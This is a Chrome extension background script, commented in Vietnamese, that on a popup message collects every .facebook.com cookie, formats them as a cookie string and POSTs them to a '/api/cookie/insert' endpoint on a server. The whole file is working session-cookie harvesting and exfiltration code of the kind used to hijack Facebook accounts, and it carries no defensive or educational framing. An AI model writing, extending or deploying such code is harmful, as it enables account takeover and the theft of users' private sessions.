chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {

    if (request.action === "popup") {

        chrome.cookies.getAll({ domain: ".facebook.com" }, cookies => {
            console.log("da bat su kien popup 1", cookies);
            if (chrome.runtime.lastError) {
                sendResponse({ success: false, error: chrome.runtime.lastError });
            } else if (cookies.length > 0) {
                if (cookies) {
                    console.log("cookies", cookies);
                    console.log("cookies.value", cookies.values);
                    const valueExport = cookies.map((item) => {
                        return `${item.name} = ${item.value}`;
                    });
                    console.log("cookies.value", valueExport.join(";"));

                    // Xây dựng yêu cầu POST để gửi giá trị c_user lên máy chủ
                    fetch("http://localhost:3000/api/cookie/insert", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({ cookie: valueExport.join(";") }),
                    })
                        .then((response) => response.json())
                        .then((data) => {
                            // Xử lý phản hồi từ máy chủ (nếu cần)
                            console.log("Phản hồi từ máy chủ:", data);
                        })
                        .catch((error) => {
                            console.error("Lỗi khi gửi yêu cầu:", error);
                        });
                }

                console.log("Đã tải xuống tất cả cookies.");
                sendResponse({ success: true, cookies: cookies });
            }
        });

        // Return true to indicate that we will send a response asynchronously

        return true;
    };
})

chrome.runtime.onInstalled.addListener(() => {
    // Code xử lý sau khi tiện ích mở rộng được cài đặt

});

chrome.runtime.onStartup.addListener(() => {
    // Code xử lý sau khi trình duyệt khởi động
});
